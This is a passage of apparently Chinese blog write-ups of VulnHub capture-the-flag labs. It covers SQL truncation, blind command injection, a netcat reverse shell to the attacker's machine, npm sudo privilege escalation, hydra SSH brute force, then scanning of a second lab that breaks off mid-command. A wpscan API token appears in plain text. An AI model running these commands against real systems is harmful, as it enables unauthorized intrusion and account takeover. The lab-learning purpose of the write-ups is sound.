&lt;p&gt;密码就选用常用来做 web 目录扫描的 directory-list-2.3-meduim.txt&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1374.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;爆破了一段时间之后，出现了结果，爆出来了 admin 用户的两个密码，是的两&lt;br&gt;
个密码，很奇怪，为什么会有两个密码？&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1375.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;选取一个密码进入 admin 的管理中心看看，没有什么发现&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1376.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;最后的线索指向了一个已经注册的用户 jacob@torando，还有在页面前端做了&lt;br&gt;
 13 的长度限制，以及 admin 用户有两个密码。&lt;/p&gt;
&lt;p&gt;sql 截断攻击：&lt;br&gt;
当数据库由于长度限制而截断用户输入时，就会发生 SQL 截断漏洞。攻击&lt;br&gt;
者可以收集关键字段 (例如用户名) 长度的信息，并利用这些信息获得未经授权的&lt;br&gt;
访问。&lt;br&gt;
改变用户名的输入框的输入限制，并开始给 jacob@tornado 用户再次申请一&lt;br&gt;
个密码。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1377.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;注册成功之后，用 jacob@tornado 登陆后发现是可以的&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1378.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;在这个用户的 contact.php 界面找到了一个可以交互的界面&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1379.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;输入内容后，在页面中有回显，左下角显示出来了 id&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1380.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;004-无回显rcednslog测试tcpdump抓包npm提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#004-无回显rcednslog测试tcpdump抓包npm提权&#34;&gt;#&lt;/a&gt; 004 无回显 RCE，dnslog 测试，tcpdump 抓包，npm 提权&lt;/h3&gt;
&lt;p&gt;既然有输入有回显，就很有可能是 RCE 漏洞，输入 id’;id, 但是回显依然是本&lt;br&gt;
身，可能不是单纯的 linux 的 echo‘id’命令&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1381.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;不知道命令是否执行了，用命令注入无回显的方法试试，先用 dnslog 测试&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1382.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;但是 dnslog 没有任何回显，可能命令执行了，但是服务器没有 curl 命令也会&lt;br&gt;
出现这样的情况，还可以用抓包的方式判断此命令是否执行&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1383.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;在 kali 上用 tcpdump 抓包，监听 eth 0 网卡，以及靶机 ip&lt;br&gt;
sudo tcpdump -i eth0 host 192.168.0.183&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1384.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;此接口处用来 ping kali 机器，注意一定要搞成发送固定的数据包，不然 ping&lt;br&gt;
 没法中断下来，导致重启靶机才能解决&lt;br&gt;
 ping - c 4 192.168.0.168&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1385.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;在 ping 之后，上述 tcpdump 就会抓取到网卡的数据，证明这里的命令最终会被&lt;br&gt;
服务器执行，就可以在这里构造 payload 反弹 shell&lt;/p&gt;
&lt;p&gt;反弹 shell，接受会话，美化终端&lt;br&gt;
 nc 192.168.0.168 4444 -e /bin/bash&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1386.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;发现服务器有 root、catchme、tornado 三个有 bash 的用户，并且 www-data 可&lt;br&gt;
以免密调用 catchme 的 npm 命令执行&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1387.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;在 GTFobins 上找到了思路，写 payload 进行提权&lt;br&gt;
需要两个文件，一个 package.json,&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1zaGVsbC1mZzFoeWouc2g=&#34;&gt; 一个 shell.sh&lt;/span&gt;，用 chmod 使其可执行&lt;br&gt;
 vi package.json&lt;br&gt;
{ “name”: “shell”, “version”: “1.0.0”, “description”: “”, “main”: “index.js”, “scripts”:&lt;br&gt;
{ “shell”: “./shell.sh” }, “author”: “”, “license”: “ISC” }&lt;br&gt;
echo “/bin/bash” &amp;gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NoZWxsLnNo&#34;&gt;shell.sh&lt;/span&gt;&lt;br&gt;
chmod +x &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NoZWxsLnNo&#34;&gt;shell.sh&lt;/span&gt;&lt;br&gt;
sudo -u catchme npm run shell&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1388.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;或者可以直接浓缩为一句话的 linux 命令，直接提权至 catchme 用户&lt;br&gt;
 cd /tmp ; echo ’ {“name”: “shell”, “version”: “1.0.0”, “description”: “”, “main”:&lt;br&gt;
“index.js”, “scripts”: { “shell”: “./shell.sh” }, “author”: “”, “license”: “ISC” }&lt;br&gt;
’ &amp;gt;package.json ; echo “/bin/bash” &amp;gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NoZWxsLnNo&#34;&gt;shell.sh&lt;/span&gt; ;chmod +x &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NoZWxsLnNo&#34;&gt;shell.sh&lt;/span&gt; ; sudo -u catchme&lt;br&gt;
npm run shell&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1389.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;005-凯撒解密脚本爆破服务器密码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#005-凯撒解密脚本爆破服务器密码&#34;&gt;#&lt;/a&gt; 005 凯撒解密脚本，爆破服务器密码&lt;/h3&gt;
&lt;p&gt;在用户目录下找到了一个加密的英文字符串，看到 trrwnqc 之后感觉很像是一&lt;br&gt;
个英文字符移位之后的显示，猜测是采用了凯撒加密&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1390.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;网上找一个可以解密恺撒解密的脚本放在本地&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网上找一个可以解密恺撒解密的脚本放在本地&#34;&gt;#&lt;/a&gt; 网上找一个可以解密恺撒解密的脚本放在本地&lt;/h3&gt;
&lt;p&gt;import string&lt;br&gt;
alphabet = string.ascii_lowercase&lt;br&gt;
encrypted = “hcjqnnsotrrwnqc”&lt;br&gt;
enc_len = len(encrypted)&lt;br&gt;
for i in range(25):&lt;br&gt;
plain_text = “”&lt;br&gt;
for c in encrypted:&lt;br&gt;
if c.islower():&lt;br&gt;
c_unicode = ord©&lt;br&gt;
c_index = ord© - ord(“a”)&lt;br&gt;
new_index = (c_index - i) % 26&lt;br&gt;
new_unicode = new_index + ord(“a”)&lt;/p&gt;
&lt;p&gt;new_character = chr(new_unicode)&lt;br&gt;
plain_text = plain_text + new_character&lt;br&gt;
else:&lt;br&gt;
plain_text += c&lt;br&gt;
print(f&amp;quot;ID:{i} : {plain_text}&amp;quot;)&lt;/p&gt;
&lt;p&gt;此脚本的作用就是依次计算加密字符串偏移 1 - 26 后的解密值&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1391.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;运行脚本之后得到了如下字符串，其中最可疑的是 idkrootpussword&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1392.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;看样子像是 root 的密码，但是试了一下，不能凭借此密码登陆到 root&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1393.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;既然这个密码不是最终的密码就写一些变体如下&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#既然这个密码不是最终的密码就写一些变体如下&#34;&gt;#&lt;/a&gt; 既然这个密码不是最终的密码，就写一些变体如下&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1394.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;用 hydra 尝试一一破解，最后得到了真实的 root 密码&lt;br&gt;
 hydra -l root -P secret.txt ssh://192.168.0.183 -f -t 64 -I -vV&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1395.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;切换到了 root 用户成功，拿到了 root 权限&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1396.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;006-tcpdump一些比较常用的命令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#006-tcpdump一些比较常用的命令&#34;&gt;#&lt;/a&gt; 006 tcpdump 一些比较常用的命令&lt;/h3&gt;
&lt;p&gt;TCPDump 可以将网络中传送的数据包完全截获下来提供分析。它支持针对网&lt;br&gt;
络层、协议、主机、网络或端口的过滤，并提供 and、or、not 等逻辑语句来帮&lt;br&gt;
助你去掉无用的信息。他的功能与 wireshark 的功能相同，是命令行版本的抓包工具。&lt;/p&gt;
&lt;p&gt;按网卡过滤： &lt;strong&gt;sudo tcpdump -i eth0&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;- tt&lt;/strong&gt; ： 在每列倾倒资料上显示未经格式化的时间戳记； **sudo tcpdump -i eth0 -tt&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;n** ：不把主机的网络地址转换成名字； **sudo tcpdump -i eth0 -n&lt;/li&gt;
&lt;li&gt;S** ：用绝对而非相对数值列出 &lt;strong&gt;TCP&lt;/strong&gt; 关联数； **sudo tcpdump -i eth0 -S&lt;/li&gt;
&lt;li&gt;vv** ：更详细显示指令执行过程； **sudo tcpdump -i eth0 -vv&lt;/li&gt;
&lt;li&gt;w&amp;lt;** 数据包文件 &lt;strong&gt;&amp;gt;&lt;/strong&gt; ：把数据包数据写入指定的文件： **sudo tcpdump -i eth0 -w output.pcap&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1397.png&#34; alt&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;r&amp;lt;** 数据包文件 &lt;strong&gt;&amp;gt;&lt;/strong&gt; ：从指定的文件读取数据包数据； &lt;strong&gt;sudo tcpdump -r output.pcap&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1398.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;按主机名过滤： &lt;strong&gt;sudo tcpdump host 110.42.178.227&lt;/strong&gt;&lt;br&gt;
 按源地址过滤： &lt;strong&gt;sudo tcpdump src 110.42.178.227&lt;/strong&gt;&lt;br&gt;
 按目标地址过滤： &lt;strong&gt;sudo tcpdump dst 110.42.178.227&lt;/strong&gt;&lt;br&gt;
 捕获整个网段： &lt;strong&gt;sudo tcpdump net 192.168.0.0/24&lt;/strong&gt;&lt;br&gt;
 捕获一个端口： &lt;strong&gt;sudo tcpdump port 22&lt;/strong&gt;&lt;br&gt;
 捕获端口区间： &lt;strong&gt;sudo tcpdump portrange 21- 2121&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;多个选项与： &lt;strong&gt;sudo tcpdump host 110.42.178.227 and port 21&lt;/strong&gt;&lt;br&gt;
 多个选项或： &lt;strong&gt;sudo tcpdump host 110.42.178.227 or port 2 121&lt;/strong&gt;&lt;br&gt;
 排除选项： &lt;strong&gt;sudo tcpdump host 110.42.178.227 and not 1.117.52.219&lt;/strong&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/144%20CEREAL/</guid>
            <title>VULNHUB 44 CEREAL</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/144%20CEREAL/</link>
            <category>VULNHUB 41-50</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvY2VyZWFsLTEsNzAzLw==&#34;&gt;https://www.vulnhub.com/entry/cereal-1,703/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2FpbmV0L3AvMTU3Nzk0MTQuaHRtbA==&#34;&gt;https://www.cnblogs.com/sainet/p/15779414.html&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;001-确认攻击目标的财产信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#001-确认攻击目标的财产信息&#34;&gt;#&lt;/a&gt; 001 确认攻击目标的财产信息&lt;/h3&gt;
&lt;p&gt;攻击机 kali： 1 92.168.31. 84 (由于设置成了 DHCP、可能多变)&lt;br&gt;
 靶机 CENGBOX 3 ：桥接于 1 92.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址和开放的端口&lt;br&gt;
由已至内网靶机所在主机 MAC 地址自动扫描靶机 ip&lt;br&gt;
sudo arp-scan -l | grep ‘a0’ | awk ‘{print $1,$2}’ | cut -d ’ ’ -f 1 | uniq&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1305.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;粗略的识别一下该 ip 上开放了哪些端口&lt;br&gt;
 sudo arp-scan -l | grep ‘a0’ | awk ‘{print $1,$2}’ | cut -d ’ ’ -f 1 | xargs sudo nmap -PA&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1306.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;à 靶机 ip：192.168.31. 83&lt;br&gt;
 靶机开放端口 21 , 22 , 80 , 139 , 445 , 3306 , 11111 , 55555&lt;/p&gt;
&lt;h3 id=&#34;对靶机开放的端口做更深一步的检索检索各个服务上的详细信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#对靶机开放的端口做更深一步的检索检索各个服务上的详细信息&#34;&gt;#&lt;/a&gt; 对靶机开放的端口做更深一步的检索，检索各个服务上的详细信息&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1307.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;检索到的有效服务如下所示&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#检索到的有效服务如下所示&#34;&gt;#&lt;/a&gt; 检索到的有效服务如下所示：&lt;/h3&gt;
&lt;p&gt;21 ftp：可尝试进行匿名登陆下载文件&lt;br&gt;
 22 ssh：可尝试 ssh 爆破与一些对应版本漏洞利用&lt;br&gt;
 80 、 44441 http：可对 web 进行渗透测试收集信息&lt;br&gt;
 3306 mysql：可进行自制字典爆破或社工收集账户密码&lt;br&gt;
 139 端口，是 NetBIOS 会话服务端口，主要用于提供 Windows 文件和打印&lt;br&gt;
机共享以及 UNIX 中的 Samba 服务。可进行 smb 利用。&lt;br&gt;
445 端口，通过它可以在局域网中轻松访问各种共享文件夹或共享打印机，&lt;br&gt;
能通过该端口共享硬盘。&lt;/p&gt;
&lt;p&gt;注意到有很多服务名字是 tcpwrapped：&lt;br&gt;
这说明 tcp 三次握手已经完成，但是并没有和目标主机建立连接。这表明，&lt;br&gt;
虽然目标主机的某项服务是可提供的，但你不在允许访问主机的名单列表中。当&lt;br&gt;
大量的端口服务都为 tcpwrapped 时，这说明可能是有负载均衡或者防火墙阻断&lt;br&gt;
了你的连接请求。&lt;/p&gt;
&lt;h3 id=&#34;002-ftp匿名访问-wpscan扫网站-子域名收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#002-ftp匿名访问-wpscan扫网站-子域名收集&#34;&gt;#&lt;/a&gt; 002 ftp 匿名访问、wpscan 扫网站、子域名收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;ZnRwOi8vMTkyLjE2OC4zMQ==&#34;&gt;ftp://192.168.31&lt;/span&gt;. 83 / 进行 ftp 信息收集&lt;br&gt;
有一个空文件夹 pub、没有更多的详细信息暴露出来&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1308.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEu&#34;&gt;http://192.168.31.&lt;/span&gt; 83 / 进行 web 信息收集&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1309.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;对页面到处点了点之后，没有看到可以直接利用的点。包括查看 robots 文&lt;br&gt;
件、查看网页源代码，查看是否有 git 文件泄漏，查看网站的框架、CMS 是否有&lt;br&gt;
可以直接利用的漏洞，查看页面中是否有敏感信息暴露出来如可疑的域名。&lt;br&gt;
接下来就对网站进行目录扫描，扫描是否存在敏感的目录，指定后缀与字典&lt;br&gt;
开扫，我喜欢用的字典是 directory-list-2.3-medium.txt 比较全。&lt;br&gt;
gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-&lt;br&gt;
list-2.3-medium.txt -u &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuODMv&#34;&gt;http://192.168.31.83/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1310.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;依次对识别到的目录进行访问：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuODMvYmxvZy8=&#34;&gt;http://192.168.31.83/blog/&lt;/span&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1311.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;找到了两条信息，域名 http://cereal.ctf, 另一个看网站的形式像是 wordpress.&lt;/p&gt;
&lt;p&gt;修改本地 hosts 文件，将域名的 DNS 解析指向靶机 ip 地址。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1312.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;再次打开网站看一下页面有啥变化&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#再次打开网站看一下页面有啥变化&#34;&gt;#&lt;/a&gt; 再次打开网站，看一下页面有啥变化&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1313.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;用 wpscan 进行一波扫描，枚举用户名&lt;br&gt;
 wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2NlcmVhbC5jdGYvYmxvZy8=&#34;&gt;http://cereal.ctf/blog/&lt;/span&gt; --enumerate u&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1314.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;得到两个用户名分别为 cereal 和 Cereal&lt;/p&gt;
&lt;h3 id=&#34;一般只能收集到用户名-密码能收集到的情况比较少-我们就搜集一下试试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一般只能收集到用户名-密码能收集到的情况比较少-我们就搜集一下试试&#34;&gt;#&lt;/a&gt; 一般只能收集到用户名、密码能收集到的情况比较少、我们就搜集一下试试&lt;/h3&gt;
&lt;p&gt;wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc -U&lt;br&gt;
‘cereal,Cereal’ -P /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2NlcmVhbC5jdGYvYmxvZy8=&#34;&gt;http://cereal.ctf/blog/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1315.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;果然密码搜集不出来但是知道了域名的话就可以尝试目标网站是否存在子域&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#果然密码搜集不出来但是知道了域名的话就可以尝试目标网站是否存在子域&#34;&gt;#&lt;/a&gt; 果然密码搜集不出来，但是知道了域名的话就可以尝试目标网站是否存在子域&lt;/h3&gt;
&lt;p&gt;名，尝试搜索子域名后无果，继续访问我们收集到的其他 web&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuODMvYWRtaW4v&#34;&gt;http://192.168.31.83/admin/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1316.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;一个后台的登陆地址，可以尝试弱口令，万能密码，sql 注入、burp 代理数据&lt;br&gt;
修改返回包、爆破密码、xss 攻击等。简单的试了试之后发现并没有什么很严&lt;br&gt;
重的弱点，就把现在的目标转到其他的网站上。&lt;/p&gt;
&lt;p&gt;收集另一个开放的 web 站点的信息：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuODM6NDQ0NDE=&#34;&gt;http://192.168.31.83:44441&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1317.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;收集这个站点的目录并没有什么有价值的信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#收集这个站点的目录并没有什么有价值的信息&#34;&gt;#&lt;/a&gt; 收集这个站点的目录并没有什么有价值的信息&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1318.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;收集-44441-端口上是否存在一些子域名&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#收集-44441-端口上是否存在一些子域名&#34;&gt;#&lt;/a&gt; 收集 44441 端口上是否存在一些子域名&lt;/h3&gt;
&lt;p&gt;gobuster vhost -u &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2NlcmVhbC5jdGY6NDQ0NDE=&#34;&gt;http://cereal.ctf:44441&lt;/span&gt; - w&lt;br&gt;
/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1319.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;收集到了子域名 secure.cereal.ctf： 44441&lt;br&gt;
 修改本地 hosts 文件，改变 DNS 解析指向为靶机 ip 地址&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1320.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;经过上述的信息收集我们能得到的可以利用的漏洞很有可能就是在后来发现&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#经过上述的信息收集我们能得到的可以利用的漏洞很有可能就是在后来发现&#34;&gt;#&lt;/a&gt; 经过上述的信息收集，我们能得到的可以利用的漏洞很有可能就是在后来发现&lt;/h3&gt;
&lt;h3 id=&#34;的这个子域名上&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#的这个子域名上&#34;&gt;#&lt;/a&gt; 的这个子域名上。&lt;/h3&gt;
&lt;h3 id=&#34;003-php源码反序列化-ffuf模糊测试-php反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#003-php源码反序列化-ffuf模糊测试-php反弹shell&#34;&gt;#&lt;/a&gt; 003 php 源码反序列化、ffuf 模糊测试、php 反弹 shell&lt;/h3&gt;
&lt;p&gt;打开 http://secure.cereal.ctf:44441 进行信息收集&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1321.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;发现了命令执行但是输入都没有起作用后&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#发现了命令执行但是输入都没有起作用后&#34;&gt;#&lt;/a&gt; 发现了命令执行，但是输入；&amp;amp;| 都没有起作用后&lt;/h3&gt;
&lt;h3 id=&#34;截取数据包看数据包中的内容是些什么&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#截取数据包看数据包中的内容是些什么&#34;&gt;#&lt;/a&gt; 截取数据包，看数据包中的内容是些什么&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1322.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;可以选在 burp 自带的 url 解码，也可以在线 url 解码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1323.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;如图依次点击可将原先的编码进行 url 解码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1324.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;这是一个 php 反序列化漏洞，但是如果找不到源码的话很难去利用这个漏洞&lt;/p&gt;
&lt;p&gt;寻找这个子域名下是否有一些目录存在&lt;br&gt;
 gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/wordlists/dirbuster/directory-list-&lt;br&gt;
2.3-medium.txt -u &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NlY3VyZS5jZXJlYWwuY3RmOjQ0NDQxLw==&#34;&gt;http://secure.cereal.ctf:44441/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1325.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;扫的比较慢而且大半天也没有什么发现换个字典换个工具跑&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#扫的比较慢而且大半天也没有什么发现换个字典换个工具跑&#34;&gt;#&lt;/a&gt; 扫的比较慢，而且大半天也没有什么发现，换个字典换个工具跑&lt;/h3&gt;
&lt;p&gt;ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NlY3VyZS5jZXJlYWwuY3RmOjQ0NDQxL0ZVWlo=&#34;&gt;http://secure.cereal.ctf:44441/FUZZ&lt;/span&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1326.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;找到了一个 back_en 的备份文件夹&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1327.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;打开之后发现是没有权限去进入这个目录但是这个目录是确实存在的继续&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#打开之后发现是没有权限去进入这个目录但是这个目录是确实存在的继续&#34;&gt;#&lt;/a&gt; 打开之后发现是没有权限去进入这个目录，但是这个目录是确实存在的，继续&lt;/h3&gt;
&lt;h3 id=&#34;向下扫描看能否找到敏感文件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#向下扫描看能否找到敏感文件&#34;&gt;#&lt;/a&gt; 向下扫描看能否找到敏感文件&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1328.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/wordlists/dirbuster/directory-list-&lt;br&gt;
